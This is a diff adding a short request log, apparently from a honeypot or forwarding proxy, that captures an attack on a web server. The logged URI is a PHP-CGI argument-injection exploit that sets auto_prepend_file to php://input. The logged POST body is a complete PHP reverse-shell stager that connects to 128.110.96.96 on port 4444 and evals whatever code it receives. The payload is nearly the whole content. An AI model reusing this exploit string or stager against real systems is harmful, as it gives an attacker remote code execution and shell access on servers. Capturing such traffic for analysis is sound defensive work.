@@ -1,0 +1,14 @@
+02-05-2024 09:28:54 root:WARNING:Request from IP: 128.110.96.96
+02-05-2024 09:28:54 root:INFO:method: b'POST'
+02-05-2024 09:28:54 root:INFO:uri: b'/?-%64+allow_url_include%3don+-%64+safe_mode%3dOfF+--define+suhosin.simulation%3dtruE+--define+disable_functions%3d%22%22+-d+open_basedir%3dnone+--define+auto_prepend_file%3dphp://input+-d+cgi.force_redirect%3dOFF+-%64+cgi.redirect_status_env%3d0+-n'
+02-05-2024 09:28:54 root:INFO:clientproto: b'HTTP/1.1'
+02-05-2024 09:28:54 root:INFO:***********************
+02-05-2024 09:28:54 root:INFO:Request forward to server: 163.114.104.81 : 80
+02-05-2024 09:28:54 root:INFO:method: b'POST'
+02-05-2024 09:28:54 root:INFO:uri: b'/?-%64+allow_url_include%3don+-%64+safe_mode%3dOfF+--define+suhosin.simulation%3dtruE+--define+disable_functions%3d%22%22+-d+open_basedir%3dnone+--define+auto_prepend_file%3dphp://input+-d+cgi.force_redirect%3dOFF+-%64+cgi.redirect_status_env%3d0+-n'
+02-05-2024 09:28:54 root:INFO:version: b'HTTP/1.1'
+02-05-2024 09:28:54 root:INFO:***********************
+02-05-2024 09:28:54 root:INFO:********  Postdata Transport  ********
+02-05-2024 09:28:54 root:INFO:b'<?php /*<?php /**/ error_reporting(0); $ip = \'128.110.96.96\'; $port = 4444; if (($f = \'stream_socket_client\') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = \'stream\'; } if (!$s && ($f = \'fsockopen\') && is_callable($f)) { $s = $f($ip, $port); $s_type = \'stream\'; } if (!$s && ($f = \'socket_create\') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = \'socket\'; } if (!$s_type) { die(\'no socket funcs\'); } if (!$s) { die(\'no socket\'); } switch ($s_type) { case \'stream\': $len = fread($s, 4); break; case \'socket\': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a[\'len\']; $b = \'\'; while (strlen($b) < $len) { switch ($s_type) { case \'stream\': $b .= fread($s, $len-strlen($b)); break; case \'socket\': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS[\'msgsock\'] = $s; $GLOBALS[\'msgsock_type\'] = $s_type; if (extension_loaded(\'suhosin\') && ini_get(\'suhosin.executor.disable_eval\')) { $suhosin_bypass=create_function(\'\', $b); $suhosin_bypass(); } else { eval($b); } die();'
+02-05-2024 09:28:54 root:INFO:*******************
+02-05-2024 09:49:07 root:INFO:***********************
